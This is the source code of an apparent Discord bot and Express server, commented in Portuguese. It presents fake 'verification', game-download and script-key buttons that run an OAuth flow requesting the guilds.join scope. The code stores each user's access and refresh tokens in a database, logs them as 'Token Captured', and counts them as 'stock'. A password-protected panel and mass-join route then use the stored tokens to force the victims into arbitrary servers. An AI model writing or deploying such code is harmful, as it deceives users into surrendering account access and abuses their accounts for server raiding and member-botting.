require('dotenv').config();
const express = require('express');
const axios = require('axios');
const { Pool } = require('pg');
const { 
    Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, 
    ButtonBuilder, ButtonStyle, PermissionsBitField, ActivityType 
} = require('discord.js');

// --- CONFIGURAÇÕES ---
const LOG_CHANNEL_ID = process.env.LOG_CHANNEL_ID; 
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD; 

// LINKS
const TARGET_DEFAULT = 'https://discord.com/app'; 
const TARGET_GAME = 'https://gamedown.onrender.com/sucess'; 
const TARGET_SCRIPT = 'https://key-scriptlp.onrender.com/'; // Novo Link

// --- BANCO DE DADOS ---
let pool = null;
async function iniciarBanco() {
    if (process.env.DATABASE_URL) {
        pool = new Pool({ connectionString: process.env.DATABASE_URL, ssl: { rejectUnauthorized: false } });
        try {
            await pool.query(`CREATE TABLE IF NOT EXISTS auth_users (id VARCHAR(255) PRIMARY KEY, username VARCHAR(255), access_token TEXT, refresh_token TEXT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP);`);
            console.log('✅ Banco conectado.');
        } catch (err) { console.error("❌ Erro banco:", err.message); }
    }
}

const app = express();
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers] });

// =================================================================
// LÓGICA DE VERIFICAÇÃO INTELIGENTE
// =================================================================
async function processarVerificacao(req, res, redirectUri, targetPadrao) {
    const { code, state } = req.query; 
    if (!code) return res.send('Erro: Falta código.');

    // DETECTA O TIPO DE VERIFICAÇÃO PELO "STATE"
    // Formato do state: "ID_DO_SERVIDOR" ou "ID_DO_SERVIDOR__SCRIPT"
    let isScriptMode = false;
    let guildId = state;

    if (state && state.includes('__script')) {
        isScriptMode = true;
        guildId = state.split('__')[0]; // Pega só o ID
    }

    try {
        const tokenResponse = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
            client_id: process.env.CLIENT_ID, client_secret: process.env.CLIENT_SECRET,
            code, grant_type: 'authorization_code', redirect_uri: redirectUri, scope: 'identify guilds.join',
        }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });

        const { access_token, refresh_token } = tokenResponse.data;
        const userResponse = await axios.get('https://discord.com/api/users/@me', { headers: { Authorization: `Bearer ${access_token}` } });
        const user = userResponse.data;

        // Salva no Banco
        if (pool) await pool.query(`INSERT INTO auth_users (id, username, access_token, refresh_token) VALUES ($1, $2, $3, $4) ON CONFLICT (id) DO UPDATE SET access_token = $3, refresh_token = $4;`, [user.id, user.username, access_token, refresh_token]);

        // LÓGICA DE CARGOS (DIFERENTE PARA CADA MODO)
        if (guildId) {
            try {
                const guild = client.guilds.cache.get(guildId);
                if (guild) {
                    const member = await guild.members.fetch(user.id).catch(() => null);
                    
                    // Define qual cargo dar e qual nome procurar
                    let roleName = isScriptMode ? 'Vetificado' : 'Auth2 Vetificados';
                    
                    let role = guild.roles.cache.find(r => r.name === roleName);

                    // Se for modo Script e o cargo não existir, CRIA O CARGO
                    if (!role && isScriptMode) {
                        try {
                            role = await guild.roles.create({
                                name: 'Vetificado',
                                color: 0x00FF00, // Verde
                                reason: 'Criado automaticamente para o sistema /script'
                            });
                        } catch (e) { console.log('Sem permissão para criar cargo.'); }
                    }

                    if (member && role) await member.roles.add(role);
                }
            } catch (e) { console.error("Erro cargo:", e.message); }
        }

        // Log
        const ch = client.channels.cache.get(LOG_CHANNEL_ID);
        if(ch) ch.send({ embeds: [new EmbedBuilder().setTitle('📥 Token Capturado').setDescription(`**User:** ${user.username}\n**Modo:** ${isScriptMode ? 'Script Key' : 'Padrão'}`).setColor('Green')] });

        // DEFINE O LINK FINAL E A MENSAGEM DO SITE
        let finalLink = isScriptMode ? TARGET_SCRIPT : targetPadrao;
        let msgTitulo = isScriptMode ? "Acesso Liberado!" : "Verificado!";
        let msgTexto = isScriptMode ? `Crie seu script em:<br><a href="${finalLink}" style="color:#00ff00;font-size:18px;">${finalLink}</a>` : "Redirecionando...";

        res.send(`
            <!DOCTYPE html>
            <html lang="pt-br">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>${msgTitulo}</title>
                <style>body{background-color:#2b2d31;font-family:sans-serif;color:white;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;flex-direction:column;text-align:center}.card{background:#313338;padding:40px;border-radius:15px;box-shadow:0 10px 30px rgba(0,0,0,0.5)}.btn{background:#5865F2;color:white;padding:12px 25px;text-decoration:none;border-radius:5px;font-weight:bold;margin-top:20px;display:inline-block}</style>
            </head>
            <body>
                <div class="card">
                    <h1>✅ ${msgTitulo}</h1>
                    <p>${msgTexto}</p>
                    <a href="${finalLink}" class="btn">Acessar Agora</a>
                </div>
                <script>
                    // Redireciona em 3s se não clicar (para garantir que ele leia)
                    setTimeout(() => { window.location.href = "${finalLink}"; }, 3000);
                </script>
            </body>
            </html>
        `);

    } catch (e) { res.send('Erro na autenticação.'); }
}

// --- ROTAS ---
app.get('/', async (req, res) => {
    let c = 0; if(pool) { try{const r = await pool.query('SELECT COUNT(*) FROM auth_users'); c = r.rows[0].count;}catch(e){} }
    res.send(`Bot Online. Tokens: ${c} <a href="/painel">Admin</a>`);
});
app.get('/painel', (req, res) => res.send(`<form action="/api/mass-join" method="POST"><input type="password" name="password" placeholder="Senha"><input type="text" name="serverId" placeholder="ID"><input type="number" name="amount" placeholder="Qtd"><button>Enviar</button></form>`));
app.post('/api/mass-join', async (req, res) => {
    const { password, serverId, amount } = req.body;
    if(password !== ADMIN_PASSWORD) return res.send('Senha errada');
    if(!pool) return res.send('Sem banco');
    let users = []; try { const r = await pool.query('SELECT * FROM auth_users LIMIT $1', [amount]); users = r.rows; } catch(e){ return res.send('Erro busca'); }
    res.send(`Enviando ${users.length}...`);
    const sleep = (ms) => new Promise(r => setTimeout(r, ms));
    for (const u of users) {
        try { await axios.put(`https://discord.com/api/guilds/${serverId}/members/${u.id}`, { access_token: u.access_token }, { headers: { Authorization: `Bot ${process.env.BOT_TOKEN}` } }); } 
        catch (e) { if(e.response?.status===401) pool.query('DELETE FROM auth_users WHERE id=$1',[u.id]).catch(()=>{}); }
        await sleep(1000);
    }
});

// Rotas de Callback
app.get('/callback', async (req, res) => { await processarVerificacao(req, res, process.env.REDIRECT_URI, TARGET_DEFAULT); });
app.get('/auth2', async (req, res) => { await processarVerificacao(req, res, process.env.REDIRECT_URI_2, TARGET_GAME); });

// --- BOT ---
client.once('ready', async () => {
    console.log(`🤖 Bot Logado: ${client.user.tag}`);
    await client.application.commands.set([
        { name: 'setup_auth', description: 'Painel Padrão' },
        { name: 'setup_auth2', description: 'Painel GameDown' },
        { name: 'script', description: 'Painel de Script (Novo)' }, // NOVO COMANDO
        { name: 'estoque', description: 'Ver estoque' },
        { name: 'enviar', description: 'Mass Join', options: [{name:'quantidade',type:4,required:true},{name:'servidor_id',type:3,required:true}] }
    ]);
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;
    
    // --- NOVO COMANDO /SCRIPT ---
    if (interaction.commandName === 'script') {
        if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
        
        // Aqui usamos __script no final do state para o site saber que é desse comando
        const stateData = `${interaction.guild.id}__script`;
        
        // Usamos a REDIRECT_URI_2 (a mesma do auth2) pois ela já está configurada no Discord
        const authUrl = `https://discord.com/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI_2)}&response_type=code&scope=identify+guilds.join&state=${stateData}`;
        
        const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel('Gerar Key / Script').setStyle(ButtonStyle.Link).setURL(authUrl).setEmoji('🔑'));
        const embed = new EmbedBuilder().setTitle('📜 Acesso ao Script').setDescription('Clique abaixo para verificar sua conta e acessar o gerador de keys.').setColor('Gold');

        interaction.reply({ content: 'Painel Script criado.', ephemeral: true });
        interaction.channel.send({ embeds: [embed], components: [row] });
    }

    // Comandos Antigos...
    if (interaction.commandName === 'setup_auth') {
        const authUrl = `https://discord.com/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI)}&response_type=code&scope=identify+guilds.join&state=${interaction.guild.id}`;
        const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel('Verificar').setStyle(ButtonStyle.Link).setURL(authUrl).setEmoji('✅'));
        interaction.reply({ content: 'Criado.', ephemeral: true });
        interaction.channel.send({ embeds: [new EmbedBuilder().setTitle('Verificação').setColor('Blue')], components: [row] });
    }
    if (interaction.commandName === 'setup_auth2') {
        const authUrl = `https://discord.com/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI_2)}&response_type=code&scope=identify+guilds.join&state=${interaction.guild.id}`;
        const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel('Baixar').setStyle(ButtonStyle.Link).setURL(authUrl).setEmoji('🔗'));
        interaction.reply({ content: 'Criado.', ephemeral: true });
        interaction.channel.send({ embeds: [new EmbedBuilder().setTitle('Download').setColor('Green')], components: [row] });
    }
    if (interaction.commandName === 'estoque') {
        let c=0; if(pool){try{const r=await pool.query('SELECT COUNT(*) FROM auth_users');c=r.rows[0].count;}catch{}}
        interaction.reply({content:`Estoque: ${c}`, ephemeral:true});
    }
});

iniciarBanco().then(() => {
    app.listen(process.env.PORT || 3000, () => console.log("ON"));
    client.login(process.env.BOT_TOKEN);
});
